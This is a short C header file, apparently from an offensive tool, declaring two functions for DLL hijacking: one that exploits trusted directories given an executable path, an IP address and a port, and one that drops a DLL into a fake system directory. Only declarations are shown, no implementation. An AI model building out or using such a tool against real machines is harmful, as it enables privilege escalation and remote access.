#pragma once

#ifndef DLL_HIJACKING_HEADER_H
#define DLL_HIJACKING_HEADER_H

BOOL ExploitTrustedDirectories(char* PathExeToRun, WCHAR* UipAddress, char* port);
BOOL DropDllFile(char* fakeSystemDir, char* fileName);

#endif